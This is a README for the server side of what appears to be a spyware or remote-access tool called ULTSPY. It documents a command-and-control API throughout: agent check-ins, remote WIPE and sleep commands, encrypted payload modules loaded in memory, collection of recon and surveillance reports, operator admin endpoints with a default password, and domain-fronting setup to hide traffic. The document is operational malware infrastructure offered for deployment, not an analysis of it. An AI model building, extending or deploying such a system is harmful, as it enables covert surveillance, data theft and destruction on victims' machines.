# Server Component

Eine minimale Flask-Anwendung, die REST-Endpunkte für Registrierung, Kommandos und Updates bereitstellt. Neu sind Endpunkte zur Heartbeat-Verarbeitung und Kommandoverteilung.

## Key Exchange
```
POST /key_exchange
{ "uuid": "<client uuid>", "public_key": "-----BEGIN RSA PUBLIC KEY-----..." }
```
Antwort:
```
{ "aes_key": "<base64 encrypted key>" }
```

## Heartbeat
```
POST /heartbeat
{ "uuid": "<client uuid>" }
```

Der Server speichert den Zeitpunkt des letzten Heartbeats pro Client. Ist kein neuer Heartbeat innerhalb von 180 Sekunden eingegangen, wechselt der Client-Status auf **offline**.

### Client-Status
Der aktuelle Zustand kann über folgenden Endpunkt abgefragt werden:

```
GET /status/<uuid>
-> { "uuid": "<uuid>", "status": "online", "last_seen": "2025-06-04T10:00:00" }
```

## Kommandos
```
POST /command/<uuid>
{ "command": "SAFE_MODE", "parameters": {} }
```
Unterstützte Befehle sind `SAFE_MODE`, `WIPE` und `DEEP_SLEEP`. Das alte Feld `cmd` wird weiterhin akzeptiert, bevorzugt wird jedoch das JSON-Format oben. Befehle werden serverseitig geloggt und beim nächsten Abruf ausgeliefert.

```
GET /commands/<uuid>
-> { "commands": [{"command":"SAFE_MODE","parameters":{}}] }
```
Jeder Eintrag enthält das Kommando und optionale Parameter.

## Payload Delivery
```
GET /payload/<uuid>/<module>
-> { "payload": "<base64 encrypted module>" }
```
Der Server liefert verschlüsselte Module, welche der gehärtete Loader im Arbeitsspeicher entschlüsselt und lädt.

## Recon Daten
``` 
POST /recon/<uuid>
{ "data": "<base64 AES(iv+json)>" }
```
Der verschlüsselte Recon-Bericht wird gespeichert und kann zu Debug-Zwecken entschlüsselt ausgegeben werden.
Das Deploy-Build übermittelt über `RECON_ADV` zusätzlich detaillierte Hardware- und Sicherheitsinformationen im selben Format.

## Active Surveillance Report
```
POST /surveillance_report/<uuid>
{ "data": "<base64 AES(iv+json)>" }
```
Der verschlüsselte Überwachungsbericht enthält laufende Prozesse, Autoruns und Sicherheitsinformationen.

## Admin Endpoints

### Login
```
POST /login
{ "username": "admin", "password": "changemeadmin" }
-> { "token": "<jwt>" }
```

Das erhaltene JWT ist 24 Stunden gültig.

Administratoren melden sich jetzt mit Benutzername und Passwort an. Die Passwörter werden bcrypt-gehasht in der Datenbank gespeichert. Das ausgegebene JWT muss im Header `Authorization: Bearer <token>` an alle `/admin/*` Endpoints angehängt werden. Ungültige oder abgelaufene Tokens führen zu `401 Unauthorized` und erfordern einen erneuten Login.

### Agents auflisten
```
GET /admin/agents
-> { "agents": [{"uuid": "<id>", "online": true, "last_seen": "..."}] }
```

### Logs eines Agents
```
GET /admin/logs/<uuid>
-> { "logs": [
     {"timestamp":"2025-06-05T20:00:00Z","type":"Recon","description":"Recon data","data":"{...}"},
     {"timestamp":"2025-06-05T20:01:00Z","type":"Info","description":"heartbeat"}
   ] }
```
Ein Eintrag enthält Zeitstempel (UTC), Typ des Eintrags (Recon, Surveillance, Info, Fehler usw.), eine Kurzbeschreibung und optional Rohdaten.

### Kommando pushen
```
POST /admin/command/<uuid>
{ "command": "SAFE_MODE", "parameters": {} }
```
Identisch zu `/command/<uuid>`, aber nur mit gültigem JWT erreichbar.

### Aktuelle Server-Konfiguration
```
GET /admin/config
-> {
     "api_keys": ["default"],
     "heartbeat_timeout": 180,
     "versions": {"backend": "dev", "frontend": "0.0.0"},
     "targets": ["localhost"],
     "allowed_hosts": ["localhost"]
   }
```
Listet die wichtigsten Einstellungen des Backends wie Heartbeat-Timeout und konfigurierte Zielhosts auf. Die API-Keys werden nur maskiert ausgegeben.

### Kommando-Templates

Wiederkehrende Befehle lassen sich als Vorlage speichern und später schnell abrufen:

```
GET /admin/templates
-> { "templates": [{"template_id":"...","name":"Daily Recon","command":"RECON","parameters":{}}] }

POST /admin/templates
{ "name": "Daily Recon", "command": "RECON", "parameters": {} }
-> { "template_id": "<id>" }

DELETE /admin/templates/<template_id>
-> { "status": "deleted" }
```

Der Name eines Templates muss eindeutig sein. Bei Dopplern liefert der Server `409 Conflict`.

### API Keys verwalten

API-Schlüssel können über folgende Endpunkte administriert werden:

```bash
GET /admin/apikeys
-> { "keys": [{"id":"...","name":"Admin","created_at":"...","last_used_at":"...","last_ip":"1.2.3.4"}] }

POST /admin/apikeys
{ "name": "Operator" }
-> { "id": "...", "secret": "<only shown once>" }

DELETE /admin/apikeys/<id>
-> { "status": "revoked" }
```

Das ausgegebene Geheimnis bei der Erstellung wird nur ein einziges Mal angezeigt und muss sicher abgelegt werden.

Alle Aktionen werden in einer Audit-Tabelle protokolliert. Darunter erfolgreiche und fehlgeschlagene Logins sowie das Erstellen und Revoken von Schlüsseln.
Abrufen der letzten Einträge:

```bash
GET /admin/audit_logs
-> { "logs": [{"timestamp":"...","action":"login_success","key_id":"...","ip":"1.2.3.4"}] }
```

Das Skript `cleanup_keys.py` listet API-Schlüssel, die länger als 90 Tage nicht benutzt wurden.

## API Hardening
Alle Agent-Requests tragen ab Version 4 eine HMAC-SHA256-Signatur. Zusätzlich wird pro Aufruf ein einmaliger Nonce sowie ein Zeitstempel übertragen:

- `X-ULTSPY-Signature`
- `X-ULTSPY-Nonce`
- `X-ULTSPY-Timestamp`

Der Server verifiziert die Signatur anhand des pro Client hinterlegten AES-Schlüssels, prüft die Zeitabweichung (±60s) und lehnt doppelte Nonces ab.

```
pip install -r requirements.txt
python app.py
```

Bei früheren Versionen wurden die API-Schlüssel in `config.json` gespeichert. Ab Version 5 werden sie in der Datenbank verwaltet. Sollten noch Keys in der Konfigurationsdatei stehen, können diese mit `python migrate_keys.py` überführt werden. Beim ersten Start ohne vorhandene Einträge erzeugt der Server automatisch einen Admin-Key und gibt das Secret im Log aus. Anschließend lassen sich weitere Keys über die `/admin/apikeys`-Schnittstelle erzeugen. Beim Login werden Benutzername und Passwort geprüft. Anschließend werden alle Admin-Aufrufe mit `Authorization: Bearer <token>` durchgeführt.

## Domain Fronting Vorbereitung

In `config.json` lässt sich eine Liste erlaubter Hostnamen konfigurieren. Bei eingehenden Anfragen prüft der Server den `Host`-Header und lehnt unbekannte Hosts ab. Über `/config/targets` kann die aktuelle Routing-Tabelle abgefragt werden.
Beispiel `config.json`:
```json
{
  "allowed_hosts": ["localhost", "example.cloudfront.net"]
}
```

## Deployment

Run `../deploy-all.sh` from the repository root. The script updates the
repository, rebuilds the backend in `server/venv`, compiles both client
variants with CMake and copies the freshly built dashboard to
`/var/www/ultspy-dashboard/` before restarting the `ultspy.service` Gunicorn
unit.

The Flask app can be reverse proxied (for example via Caddy or Nginx). Logs are
written to STDOUT by Gunicorn and should be captured by the supervising service
manager.
